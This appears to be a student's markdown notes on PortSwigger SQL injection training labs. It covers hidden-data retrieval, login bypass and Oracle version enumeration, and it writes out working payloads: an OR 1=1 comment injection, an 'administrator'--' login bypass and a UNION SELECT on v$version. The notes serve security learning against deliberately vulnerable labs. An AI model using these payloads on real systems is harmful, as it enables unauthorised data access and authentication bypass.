# PortSwigger Labs
<!-- vscode-markdown-toc -->
* 1. [SQL Injection](#SQLInjection)
	* 1.1. [Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#Lab01:SQLinjectionvulnerabilityinWHEREclauseallowingretrievalofhiddendata)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

[PortSwigger Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[PortSwigger Labs](https://portswigger.net/web-security/all-labs#sql-injection)

----

##  1. <a name='SQLInjection'></a>SQL Injection
###  1.1. <a name='Lab01:SQLinjectionvulnerabilityinWHEREclauseallowingretrievalofhiddendata'></a>Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Level: Apprentice

![](imgs/2023-09-11-19-55-50.png)

'?category='
![](imgs/2023-09-11-19-57-59.png)

the application carries out a SQL query like the following:
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

You can put the clause 'AND released = 1' after a '--' quote (comment syntax). Then the clause 'AND released = 1' no longer available.

Query:
```
?category=Gifts' or 1=1--;'
?category=Gifts%27%20or%201=1--;%27
```

![](imgs/2023-09-11-20-09-36.png)

### Lab 02: SQL injection vulnerability allowing login bypass
[Link](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

![](imgs/2023-09-11-20-33-25.png)

Query:
```
Username: administrator'--
Password: random
```

### Lab 03: SQL injection attack, querying the database type and version on Oracle

[Link](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

Query:
```
?category=Gifts' UNION SELECT 'a',banner FROM v$version--
```

![](imgs/2023-09-11-20-50-41.png)

### Lab 04: SQL injection attack, querying the database type and version on MySQL and Microsoft
[Link](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

